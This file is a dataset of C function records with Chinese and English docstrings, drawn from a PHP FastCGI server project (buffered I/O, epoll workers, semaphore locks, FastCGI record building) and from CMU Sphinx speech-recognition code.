sockaddr));\n                in_len = 1;\n\n                infd = accept(sfd, &in_addr, &in_len);\n                if (infd == -1) {\n                    error_log(\"accept error\", DEBUGARGS);\n                    v(sl);\n                    continue;\n                }\n                ln++;\n\n                // \u5c06\u63a5\u6536\u7684\u5957\u63a5\u5b57\u52a0\u5165\u76d1\u542c\u961f\u5217\n                event.data.fd = infd;\n                event.events = EPOLLIN;\n                epoll_ctl(efd, EPOLL_CTL_ADD, infd, &event);\n\n                // \u5220\u9664sfd\u7684\u76d1\u542c\n                epoll_ctl(efd, EPOLL_CTL_DEL, sfd, NULL);\n\n                // \u91ca\u653e\u9501\n                v(sl);\n                ls = -1;\n            }\n            // \u6709\u6570\u636e\u53ef\u8bfb\n            else if (events[j].events & EPOLLIN) {\n                doit(events[j].data.fd);\n\n                ln--;\n                epoll_ctl(efd, EPOLL_CTL_DEL, events[j].data.fd, NULL);\n                close(events[j].data.fd);\n\n            }\n        }\n    }\n}", "path": "schedule\\zhou-m.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u4ece\u6587\u4ef6rp\u4e2d\u8bfb\u53d6\u4e00\u884c\u6570\u636e\uff08\u5305\u62ec\u7ed3\u5c3e\u7684\u6362\u884c\u7b26\uff09\uff0c\u62f7\u8d1d\u5230usrbuf\n * \u5e76\u75280\u5b57\u7b26\u6765\u7ed3\u675f\u8fd9\u884c\u6570\u636e\n */\n", "func_signal": "ssize_t rio_readlineb(rio_t *rp, void *usrbuf, size_t maxlen)", "code": "{\n    int n, rc;\n    char c, *bufp = usrbuf;\n\n    for (n = 1; n < maxlen; n++) {\n        if ((rc = rio_read(rp, &c, 1)) == 1) {\n            *bufp++ = c;\n            if (c == '\\n') { // \u8bfb\u5b8c\u4e86\u4e00\u884c\n                break;\n            }\n        } else if (rc == 0) {\n            if (n == 1) {\n                return 0; // EOF,\u4f46\u6ca1\u6709\u8bfb\u53d6\u4efb\u4f55\u6570\u636e\n            } else {\n                break; //EOF,\u4f46\u5df2\u7ecf\u8bfb\u53d6\u4e86\u4e00\u4e9b\u6570\u636e\n            }\n        } else { // \u51fa\u9519\n            return -1;\n        }\n    }\n\n    *bufp = 0;\n    return n;\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u6784\u9020\u8bf7\u6c42\u5f00\u59cb\u8bb0\u5f55\u534f\u8bae\u4f53\uff0c\u8fd4\u56deFCGI_BeginRequestBody\u7ed3\u6784\u4f53\n */\n", "func_signal": "FCGI_BeginRequestBody makeBeginRequestBody(int role, int keepConn)", "code": "{\n\tFCGI_BeginRequestBody body;\n\tbody.roleB1 = (unsigned char) ((role >>  8) & 0xff);\n\tbody.roleB0 = (unsigned char) (role         & 0xff);\n\tbody.flags  = (unsigned char) ((keepConn) ? 1 : 0); // 1\u4e3a\u957f\u8fde\u63a5\uff0c0\u4e3a\u77ed\u8fde\u63a5\n\tmemset(body.reserved, 0, sizeof(body.reserved));\n\treturn body;\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u521d\u59cb\u5316\u5e76\u521b\u5efa\u4e00\u4e2a\u547d\u540d\u4fe1\u53f7\u91cf\n */\n", "func_signal": "slock * lock_init(const char *name)", "code": "{\n    slock *sl;\n\n    if ((sl = malloc(sizeof(struct _slock))) == NULL) {\n        return NULL;\n    }\n\n    memset(sl->name, '\\0', sizeof(sl->name));\n    strcpy(sl->name, name);\n\n    if ((sl->semp = sem_open(sl->name, O_CREAT, 0644, 1)) == SEM_FAILED) {\n        free(sl);\n        return NULL;\n    }\n\n    return sl;\n}", "path": "schedule\\mylock.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u521d\u59cb\u5316\u5185\u90e8\u7f13\u51b2\u533ario_t\u7ed3\u6784\n */\n", "func_signal": "void rio_readinitb(rio_t *rp, int fd)", "code": "{\n    rp->rio_fd = fd;\n    rp->rio_cnt = 0;\n    rp->rio_bufptr = rp->rio_buf;\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u4ece\u63cf\u8ff0\u7b26fd\u4e2d\u8bfb\u53d6n\u4e2a\u5b57\u8282\u5230\u5b58\u50a8\u5668\u4f4d\u7f6eusrbuf\n */\n", "func_signal": "ssize_t rio_readn(int fd, void *usrbuf, size_t n)", "code": "{\n    size_t nleft = n; // \u5269\u4e0b\u7684\u672a\u8bfb\u5b57\u8282\u6570\n    ssize_t nread;\n    char *bufp = usrbuf;\n\n    while (nleft > 0) {\n        if ((nread = read(fd, bufp, nleft)) < 0) {\n            if (errno == EINTR) { // \u88ab\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u4e2d\u65ad\u8fd4\u56de\n                nread = 0;\n            } else {\n                return -1;  // read\u51fa\u9519 \n            }\n        } else if (nread == 0) { // EOF\n            break;\n        }\n        nleft -= nread;\n        bufp += nread;\n    }\n\n    return (n - nleft); // \u8fd4\u56de\u5df2\u7ecf\u8bfb\u53d6\u7684\u5b57\u8282\u6570\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u53d1\u9001\u7a7a\u7684params\u8bb0\u5f55\n * \u53d1\u9001\u6210\u529f\u8fd4\u56de0\n * \u51fa\u9519\u8fd4\u56de-1\n */\n", "func_signal": "int sendEmptyParamsRecord(write_record wr, int fd, int requestId)", "code": "{\n    int ret;\n    FCGI_Header nvHeader = makeHeader(FCGI_PARAMS, requestId, 0, 0);\n    ret = wr(fd, (char *)&nvHeader, FCGI_HEADER_LEN);\n\n    if (ret == FCGI_HEADER_LEN) {\n        return 0;\n    } else {\n        return -1;\n    }\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u5c06usrbuf\u7f13\u51b2\u533a\u4e2d\u7684\u524dn\u4e2a\u5b57\u8282\u6570\u636e\u5199\u5165fd\u4e2d\n * \u8be5\u51fd\u6570\u4f1a\u4fdd\u8bc1n\u4e2a\u5b57\u8282\u90fd\u4f1a\u5199\u5165fd\u4e2d\n */\n", "func_signal": "ssize_t rio_writen(int fd, void *usrbuf, size_t n)", "code": "{\n    size_t nleft = n; // \u5269\u4e0b\u7684\u672a\u5199\u5165\u5b57\u8282\u6570\n    ssize_t nwritten;\n    char *bufp = (char *)usrbuf;\n\n    while (nleft > 0) {\n        if ((nwritten = write(fd, bufp, nleft)) <= 0) {\n            if (errno == EINTR) { // \u88ab\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u4e2d\u65ad\u8fd4\u56de\n                nwritten = 0;\n            } else { // write\u51fd\u6570\u51fa\u9519\n                return -1;\n            }\n        }\n        nleft -= nwritten;\n        bufp += nwritten;\n    }\n\n    return n;\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * php\u5904\u7406\u7ed3\u679c\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\n */\n", "func_signal": "int send_to_cli(int fd, int outlen, char *out, \n        int errlen, char *err, FCGI_EndRequestBody *endr\n        )", "code": "{\n    char *p;\n    int n;\n\n    if (outlen > 0) {\n        p = index(out, '\\r'); \n        n = (int)(p - out);\n        if (rio_writen(fd, p + 3, outlen - n - 3) < 0) {\n            return -1;\n        }\n    }\n\n    if (errlen > 0) {\n        if (rio_writen(fd, err, errlen) < 0) {\n            return -1;\n        }\n    }\n}", "path": "test\\test-fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "// \u8bbe\u7f6e\u4fe1\u53f7\u7684\u5904\u7406\u51fd\u6570\n", "func_signal": "void addsig(int sig)", "code": "{\n    struct sigaction sa;\n    memset(&sa, '\\0', sizeof(sa));\n    sa.sa_handler = sig_handler;\n    sigaction(sig, &sa, NULL);\n}", "path": "schedule\\zhou-m.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u53d1\u9001\u540d\u503c\u5bf9\u53c2\u6570\n * \u53d1\u9001\u6210\u529f\u8fd4\u56de0\n * \u51fa\u9519\u8fd4\u56de-1\n */\n", "func_signal": "int sendParamsRecord(\n        write_record wr,\n        int fd,\n        int requestId,\n        char *name,\n        int nlen,\n        char *value,\n        int vlen)", "code": "{\n    unsigned char *buf, *old;\n    int ret, pl,  cl = nlen + vlen;\n    cl = (nlen < 128) ? ++cl : cl + 4; \n    cl = (vlen < 128) ? ++cl : cl + 4; \n\n    // \u8ba1\u7b97\u586b\u5145\u6570\u636e\u957f\u5ea6\n    pl = (cl % 8) == 0 ? 0 : 8 - (cl % 8);\n    old = buf = (unsigned char *)malloc(FCGI_HEADER_LEN + cl + pl);\n\n    FCGI_Header nvHeader = makeHeader(FCGI_PARAMS, requestId, cl, pl);\n    memcpy(buf, (char *)&nvHeader, FCGI_HEADER_LEN);\n    buf = buf + FCGI_HEADER_LEN;\n\n    if (nlen < 128) { // name\u957f\u5ea6\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528\u4e00\u4e2a\u5b57\u8282\u4fdd\u5b58\u957f\u5ea6\n        *buf++ = (unsigned char)nlen;\n    } else { // \u5927\u4e8e\u7b49\u4e8e128\u75284\u4e2a\u5b57\u8282\u4fdd\u5b58\u957f\u5ea6\n        *buf++ = (unsigned char)((nlen >> 24) | 0x80);\n        *buf++ = (unsigned char)(nlen >> 16);\n        *buf++ = (unsigned char)(nlen >> 8);\n        *buf++ = (unsigned char)nlen;\n    }\n\n    if (vlen < 128) { // value\u957f\u5ea6\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528\u4e00\u4e2a\u5b57\u8282\u4fdd\u5b58\u957f\u5ea6\n        *buf++ = (unsigned char)vlen;\n    } else { // \u5927\u4e8e\u7b49\u4e8e128\u75284\u4e2a\u5b57\u8282\u4fdd\u5b58\u957f\u5ea6\n        *buf++ = (unsigned char)((vlen >> 24) | 0x80);\n        *buf++ = (unsigned char)(vlen >> 16);\n        *buf++ = (unsigned char)(vlen >> 8);\n        *buf++ = (unsigned char)vlen;\n    }\n\n    memcpy(buf, name, nlen);\n    buf = buf + nlen;\n    memcpy(buf, value, vlen);\n\n    ret = wr(fd, old, FCGI_HEADER_LEN + cl + pl);\n\n    free(old);\n\n    if (ret == (FCGI_HEADER_LEN + cl + pl)) {\n        return 0;\n    } else {\n        return -1;\n    }\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "// \u8bbe\u7f6e\u4fe1\u53f7\u7684\u5904\u7406\u51fd\u6570\n", "func_signal": "void addsig(int sig)", "code": "{\n    struct sigaction sa;\n    memset(&sa, '\\0', sizeof(sa));\n    sa.sa_handler = sig_handler;\n    sigaction(sig, &sa, NULL);\n}", "path": "schedule\\thundering.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "// \u5b50\u8fdb\u7a0b\u6267\u884c\u4f53\n", "func_signal": "int process_run(int sfd, slock *sl)", "code": "{\n    int efd, ret, i;\n    int ln = 0; // \u8fde\u63a5\u6570\n    int ls = -1; // \u9501\u51fd\u6570\u7684\u8fd4\u56de\u503c\n    char buf[100];\n\n    struct epoll_event event;\n    struct epoll_event events[MAX_EVENTS];\n\n    // \u6bcf\u4e2a\u5b50\u8fdb\u7a0b\u521b\u5efa\u81ea\u5df1\u7684epoll fd\n    efd = epoll_create(MAX_EVENTS);\n    if (efd < 0) {\n        printf(\"epoll_create error\\n\");\n        return -1;\n    }\n\n    printf(\"process %d forked\\n\", getpid());\n\n    // \u4e8b\u4ef6\u5faa\u73af\n    while (1) {\n        /*\n         * \u5224\u65ad\u8fde\u63a5\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0,\u963b\u585e\u7b49\u5f85\n         * \u4e0d\u4e3a0,\u975e\u963b\u585e\u7b49\u5f85\u9501\n         */\n        printf(\"process %d have %d connections\\n\", getpid(), ln);\n\n        // \u5224\u65ad\u662f\u5426\u5df2\u7ecf\u83b7\u5f97\u4e86\u9501\n        if (ls == -1) { // \u672a\u83b7\u5f97\u9501\n            if (ln > 0) {\n                ls = p(sl, 0);\n                printf(\"process %d get trywait lock\\n\", getpid());\n            } else {\n                // \u963b\u585e\u7b49\u5f85\u9501\n                ls = p(sl, 1);\n                if (ls == -1) {\n                    continue;\n                }\n                printf(\"process %d get wait lock\\n\", getpid());\n            }\n\n            if (ls == 0) {\n                // \u83b7\u53d6\u5230\u9501\uff0c\u5c06\u76d1\u542c\u5957\u63a5\u5b57sfd\u52a0\u5165epoll\u4e2d\n                event.data.fd = sfd;\n                event.events = EPOLLIN;\n                if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) < 0) {\n                    printf(\"epoll_ctl error\\n\");\n                    printf(\"\\n%s\\n\", strerror(errno));\n                    v(sl);\n                    ls = -1;\n                    if (ln == 0) {\n                        continue;\n                    }\n                }\n                printf(\"process %d epoll add sfd : %d\\n\", getpid(), sfd);\n            }\n        }\n\n        int j, n;\n        n = epoll_wait(efd, events, MAX_EVENTS, -1);\n        if (n < 1) {\n            printf(\"epoll wait error\\n\");\n            return -1;\n        }\n        printf(\"process %d return from epoll_wait %d!\\n\", getpid(), n);\n\n        //sleep(1);\n        for (j = 0; j < n; j++) {\n\n            if ((events[j].events & EPOLLERR) || (events[j].events & EPOLLHUP) || \n                    !(events[j].events & EPOLLIN)) {\n                printf(\"process %d epoll error\\n\", getpid());\n                printf(\"\\n%d : %s\\n\", errno, strerror(errno));\n\n                // \u4eceepoll\u5220\u9664\u8be5\u76d1\u542c\u5957\u63a5\u5b57\n                epoll_ctl(efd, EPOLL_CTL_DEL, events[j].data.fd, NULL);\n\n                // \u5173\u95ed\u8be5\u5957\u63a5\u5b57\n                if (events[j].data.fd != sfd) {\n                    close(events[j].data.fd);\n                }\n\n                // \u91ca\u653e\u9501\n                if (ls == 0) {\n                    v(sl);\n                    ls = -1;\n                }\n            }\n            // \u6709\u8fde\u63a5\u8bf7\u6c42\n            else if ((events[j].events & EPOLLIN) && (events[j].data.fd == sfd)) {\n                struct sockaddr in_addr;\n                socklen_t in_len;\n                int infd;\n                memset(&in_addr, 0, sizeof(struct sockaddr));\n                in_len = 1;\n\n                infd = accept(sfd, &in_addr, &in_len);\n                if (infd == -1) {\n                    printf(\"process %d accept failed!\\n\", getpid());\n                    printf(\"\\n%d : %s\\n\", errno, strerror(errno));\n                    v(sl);\n                    continue;\n                }\n                ln++;\n                printf(\"process %d accept successed, accepted num: %d\\n\", getpid(), ln);\n\n                // \u5c06\u63a5\u6536\u7684\u5957\u63a5\u5b57\u52a0\u5165\u76d1\u542c\u961f\u5217\n                event.data.fd = infd;\n                event.events = EPOLLIN;\n                epoll_ctl(efd, EPOLL_CTL_ADD, infd, &event);\n\n                // \u5220\u9664sfd\u7684\u76d1\u542c\n                epoll_ctl(efd, EPOLL_CTL_DEL, sfd, NULL);\n\n                // \u91ca\u653e\u9501\n                v(sl);\n                ls = -1;\n                //sleep(1);\n            }\n            // \u6709\u6570\u636e\u53ef\u8bfb\n            else if (events[j].events & EPOLLIN) {\n                int n = read(events[j].data.fd, buf, 100);\n                buf[n] = '\\0';\n                printf(\"process %d read : %s\\n\", getpid(), buf);\n\n                ln--;\n                epoll_ctl(efd, EPOLL_CTL_DEL, events[j].data.fd, NULL);\n                close(events[j].data.fd);\n\n                if (!strcasecmp(buf, \"bye\")) {\n                    lock_close(sl);\n                    exit(0);\n                }\n            }\n        }\n    }\n}", "path": "schedule\\thundering.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u4ece\u6587\u4ef6rp\u4e2d\u8bfb\u53d6n\u5b57\u8282\u6570\u636e\u5230usrbuf\n */\n", "func_signal": "ssize_t rio_readnb(rio_t *rp, void *usrbuf, size_t n)", "code": "{\n    size_t nleft = n; // \u5269\u4e0b\u7684\u672a\u8bfb\u53d6\u5b57\u8282\u6570\n    ssize_t nread;\n    char *bufp = usrbuf;\n\n    while (nleft > 0) {\n        if ((nread = rio_read(rp, bufp, nleft)) < 0) {\n            if(errno == EINTR) { // \u88ab\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u65ad\u8fd4\u56de\n                nread = 0;\n            } else {\n                return -1; // \u8bfb\u53d6\u6570\u636e\u51fa\u9519\n            }\n        } else if(nread == 0) { // EOF\n            break; \n        } \n        nleft -= nread;\n        bufp += nread;\n    }\n\n    return (n - nleft);\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u53d1\u9001\u5f00\u59cb\u8bf7\u6c42\u8bb0\u5f55\n * \u53d1\u9001\u6210\u529f\u8fd4\u56de0\n * \u51fa\u9519\u8fd4\u56de-1\n */\n", "func_signal": "int sendBeginRequestRecord(write_record wr, int fd, int requestId)", "code": "{\n    int ret;\n    // \u6784\u9020\u4e00\u4e2aFCGI_BeginRequestRecord\u7ed3\u6784\n    FCGI_BeginRequestRecord beginRecord;\n\n    beginRecord.header = \n        makeHeader(FCGI_BEGIN_REQUEST, requestId, sizeof(beginRecord.body), 0);\n    beginRecord.body = makeBeginRequestBody(FCGI_RESPONDER, 0);\n\n    ret = wr(fd, &beginRecord, sizeof(beginRecord));\n\n    if (ret == sizeof(beginRecord)) {\n        return 0;\n    } else {\n        return -1;\n    }\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u6784\u9020\u534f\u8bae\u8bb0\u5f55\u5934\u90e8\uff0c\u8fd4\u56deFCGI_Header\u7ed3\u6784\u4f53\n */\n", "func_signal": "FCGI_Header makeHeader(\n\t\tint type,\n\t\tint requestId,\n\t\tint contentLength,\n\t\tint paddingLength)", "code": "{\n\tFCGI_Header header;\n\theader.version = FCGI_VERSION_1;\n\theader.type             = (unsigned char) type;\n\theader.requestIdB1      = (unsigned char) ((requestId     >> 8) & 0xff);\n\theader.requestIdB0      = (unsigned char) ((requestId         ) & 0xff);\n\theader.contentLengthB1  = (unsigned char) ((contentLength >> 8) & 0xff);\n\theader.contentLengthB0  = (unsigned char) ((contentLength     ) & 0xff);\n\theader.paddingLength    = (unsigned char) paddingLength;\n\theader.reserved         =  0;\n\treturn header;\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u7b49\u5f85\u4fe1\u53f7\u91cf\n * wait\u4e3a0\uff0c\u8868\u793a\u975e\u963b\u585e\u7b49\u5f85\n * wait\u4e3a1\uff0c\u8868\u793a\u963b\u585e\u7b49\u5f85\n */\n", "func_signal": "int p(slock *sl, int wait)", "code": "{\n    if (wait) {\n        return sem_wait(sl->semp);\n    } else {\n        return sem_trywait(sl->semp);\n    }\n}", "path": "schedule\\mylock.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u5173\u95ed\u547d\u540d\u4fe1\u53f7\u91cf\n * \u548c\u91ca\u653e\u9501\u5360\u7528\u7684\u5806\u7a7a\u95f4\n */\n", "func_signal": "void lock_close(slock *sl)", "code": "{\n    sem_close(sl->semp);\n    sem_unlink(sl->name);\n    free(sl);\n}", "path": "schedule\\mylock.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u53d1\u9001\u7a7a\u7684FCGI_STDIN\u8bb0\u5f55\n * \u53d1\u9001\u6210\u529f\u8fd4\u56de0\n * \u51fa\u9519\u8fd4\u56de-1\n */\n", "func_signal": "int sendEmptyStdinRecord(write_record wr, int fd, int requestId)", "code": "{\n    int ret;\n    FCGI_Header sinHeader = makeHeader(FCGI_STDIN, requestId, 0, 0);\n    ret = wr(fd, (char *)&sinHeader, FCGI_HEADER_LEN);\n\n    if (ret == FCGI_HEADER_LEN) {\n        return 0;\n    } else {\n        return -1;\n    }\n}", "path": "fastcgi.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/*\n * \u7cfb\u7edf\u8c03\u7528read\u51fd\u6570\u7684\u5305\u88c5\u51fd\u6570\n * \u76f8\u5bf9\u4e8eread\uff0c\u589e\u52a0\u4e86\u5185\u90e8\u7f13\u51b2\u533a\n */\n", "func_signal": "static ssize_t rio_read(rio_t *rp, char *usrbuf, size_t n)", "code": "{\n    int cnt;\n\n    // \u5185\u90e8\u7f13\u51b2\u533a\u4e3a\u7a7a\uff0c\u4ece\u7f13\u51b2\u533a\u5bf9\u5e94\u7684\u63cf\u8ff0\u7b26\u4e2d\u7ee7\u7eed\u8bfb\u53d6\u5b57\u8282\u586b\u6ee1\u5185\u90e8\u7f13\u51b2\u533a\n    while (rp->rio_cnt <= 0) { \n        rp->rio_cnt = read(rp->rio_fd, rp->rio_buf, sizeof(rp->rio_buf));\n\n        if (rp->rio_cnt < 0) { // \u8fd4\u56de-1\n            if (errno != EINTR) {\n                return -1;\n            }\n        } else if (rp->rio_cnt == 0) { // EOF\n            return 0;\n        } else { \n            rp->rio_bufptr = rp->rio_buf;\n        }\n    }\n\n    // \u6bd4\u8f83\u8c03\u7528\u6240\u9700\u7684\u5b57\u8282\u6570n\u4e0e\u5185\u90e8\u7f13\u51b2\u533a\u53ef\u8bfb\u5b57\u8282\u6570rp->rio_cnt\n    // \u53d6\u5176\u4e2d\u6700\u5c0f\u503c\n    cnt = n;\n    if (rp->rio_cnt < n) {\n        cnt = rp->rio_cnt;\n    }\n    memcpy(usrbuf, rp->rio_bufptr, cnt);\n    rp->rio_bufptr += cnt;\n    rp->rio_cnt -= cnt;\n\n    return cnt;\n}", "path": "rio.c", "repo_name": "jaykizhou/php-server", "stars": 100, "license": "None", "language": "c", "size": 443}
{"docstring": "/* END ADDITION FOR CONTINUOUS_TREES */\n", "func_signal": "uint32\ncnt_leaf(dtree_node_t *node)", "code": "{\n    if ((node->y == NULL) && (node->n == NULL)) {\n\treturn 1;\n    }\n    else {\n\treturn cnt_leaf(node->y) + cnt_leaf(node->n);\n    }\n}", "path": "SphinxTrain\\src\\libs\\libcommon\\dtree.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "// User program\n", "func_signal": "void main()", "code": "{\n\n   \n    int a;\n    u8 input;\n    char *test;\n    \n \tfor (a=0;a<16;a++)\n\t\tezInitLED(a);\n   \n\tdevInit();\n    UARTinit( BAUD_RATE );\n    ezErrorCheck(FS_STDIO_init(5));\n\t\t\n\tprintf(\"Pocket sphinx on BF561 without linux\\r\\nFree Heap Memory: %d\\r\\n\",space_unused());\n\t\n\tprintf(\"fbs_init()\\r\\n\");\n\n \n    fbs_init(sizeof(fake_argv)/sizeof(char*) -1, fake_argv);\n\n   \tprintf(\"ad_open_sps()\\r\\n\");\n\n    if ((ad = ad_open_sps(cmd_ln_float32(\"-samprate\"))) == NULL)\n        E_FATAL(\"ad_open_sps failed\\n\");\n        \n\tprintf(\"utterance_loop()\\r\\n\");\n\tutterance_loop();\n\n\tprintf(\"fbs_end()\\r\\n\");\n    fbs_end();\n\tprintf(\"ad_close()\\r\\n\");\n    ad_close(ad);\n}", "path": "pocketsphinx\\visualdsp\\pocketsphinx_continuous\\CoreA\\main.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* This looks bad, but it actually isn't.  Less than 1% of eval_cb's\n * time is spent doing this. */\n", "func_signal": "static void\ninsertion_sort_cb(ptm_topn_t **cur, ptm_topn_t *worst, ptm_topn_t *best,\n                  int cw, int32 intd)", "code": "{\n    for (*cur = worst - 1; *cur >= best && intd >= (*cur)->score; --*cur)\n        memcpy(*cur + 1, *cur, sizeof(**cur));\n    ++*cur;\n    (*cur)->cw = cw;\n    (*cur)->score = intd;\n}", "path": "pocketsphinx\\src\\libpocketsphinx\\ptm_mgau.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* *********************************************************************** */\n", "func_signal": "doublereal\nslamc3_(real * a, real * b)", "code": "{\n    /* System generated locals */\n    real ret_val;\n\n\n/*  -- LAPACK auxiliary routine (version 3.0) -- */\n/*     Univ. of Tennessee, Univ. of California Berkeley, NAG Ltd., */\n/*     Courant Institute, Argonne National Lab, and Rice University */\n/*     October 31, 1992 */\n\n/*     .. Scalar Arguments .. */\n/*     .. */\n\n/*  Purpose */\n/*  ======= */\n\n/*  SLAMC3  is intended to force  A  and  B  to be stored prior to doing */\n/*  the addition of  A  and  B ,  for use in situations where optimizers */\n/*  might hold one of these in a register. */\n\n/*  Arguments */\n/*  ========= */\n\n/*  A, B    (input) REAL */\n/*          The values A and B. */\n\n/* ===================================================================== */\n\n/*     .. Executable Statements .. */\n\n    ret_val = *a + *b;\n\n    return ret_val;\n\n/*     End of SLAMC3 */\n\n}", "path": "sphinxbase\\src\\libsphinxbase\\util\\slamch.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/* RAH 4.15.01 Lots of memory is allocated, but never freed, this function will clean up.\n * First pass will get the low hanging fruit.*/\n", "func_signal": "void kb_free (kb_t *kb)", "code": "{\n  vithist_t *vithist = kb->vithist;\n\n  if (kb->sen_active)\n    ckd_free ((void *)kb->sen_active);\n  if (kb->ssid_active) \n    ckd_free ((void *)kb->ssid_active);\n  if (kb->comssid_active)\n    ckd_free ((void *)kb->comssid_active);\n  if (kb->fillertree) \n    ckd_free ((void *)kb->fillertree);\n  if (kb->hmm_hist) \n    ckd_free ((void *)kb->hmm_hist);\n  \n\n  /* vithist */\n  if (vithist) {\n    ckd_free ((void *) vithist->entry);\n    ckd_free ((void *) vithist->frame_start);\n    ckd_free ((void *) vithist->bestscore);\n    ckd_free ((void *) vithist->bestvh);\n    ckd_free ((void *) vithist->lms2vh_root);    \n    ckd_free ((void *) kb->vithist);\n  }\n\n\n  kbcore_free (kb->kbcore);\n\n  if (kb->feat) {\n    ckd_free ((void *)kb->feat[0][0]);\n    ckd_free_2d ((void **)kb->feat);\n  }\n    \n}", "path": "archive_s3\\s3.3\\src\\libs3decoder\\kb.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/**\n * Compute senone scores for the active senones.\n */\n", "func_signal": "int32\nptm_mgau_frame_eval(ps_mgau_t *ps,\n                    int16 *senone_scores,\n                    uint8 *senone_active,\n                    int32 n_senone_active,\n                    mfcc_t ** featbuf, int32 frame,\n                    int32 compallsen)", "code": "{\n    ptm_mgau_t *s = (ptm_mgau_t *)ps;\n    int fast_eval_idx;\n\n    /* Find the appropriate frame in the rotating history buffer\n     * corresponding to the requested input frame.  No bounds checking\n     * is done here, which just means you'll get semi-random crap if\n     * you request a frame in the future or one that's too far in the\n     * past.  Since the history buffer is just used for fast match\n     * that might not be fatal. */\n    fast_eval_idx = frame % s->n_fast_hist;\n    s->f = s->hist + fast_eval_idx;\n    /* Compute the top-N codewords for every codebook, unless this\n     * is a past frame, in which case we already have them (we\n     * hope!) */\n    if (frame >= ps_mgau_base(ps)->frame_idx) {\n        ptm_fast_eval_t *lastf;\n        /* Get the previous frame's top-N information (on the\n         * first frame of the input this is just all WORST_DIST,\n         * no harm in that) */\n        if (fast_eval_idx == 0)\n            lastf = s->hist + s->n_fast_hist - 1;\n        else\n            lastf = s->hist + fast_eval_idx - 1;\n        /* Copy in initial top-N info */\n        memcpy(s->f->topn[0][0], lastf->topn[0][0],\n               s->g->n_mgau * s->g->n_feat * s->max_topn * sizeof(ptm_topn_t));\n        /* Generate initial active codebook list (this might not be\n         * necessary) */\n        ptm_mgau_calc_cb_active(s, senone_active, n_senone_active, compallsen);\n        /* Now evaluate top-N, prune, and evaluate remaining codebooks. */\n        ptm_mgau_codebook_eval(s, featbuf, frame);\n    }\n    /* Evaluate intersection of active senones and active codebooks. */\n    ptm_mgau_senone_eval(s, senone_scores, senone_active,\n                         n_senone_active, compallsen);\n\n    return 0;\n}", "path": "pocketsphinx\\src\\libpocketsphinx\\ptm_mgau.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
{"docstring": "/*\n * Make the next_active information within all lextrees be the current one, after blowing\n * away the latter; in preparation for moving on to the next frame.\n */\n", "func_signal": "void kb_lextree_active_swap (kb_t *kb)", "code": "{\n    int32 i;\n    \n    for (i = 0; i < kb->n_lextree; i++) {\n\tlextree_active_swap (kb->ugtree[i]);\n\tlextree_active_swap (kb->fillertree[i]);\n    }\n}", "path": "archive_s3\\s3.3\\src\\libs3decoder\\kb.c", "repo_name": "cjac/cmusphinx", "stars": 121, "license": "None", "language": "c", "size": 401144}
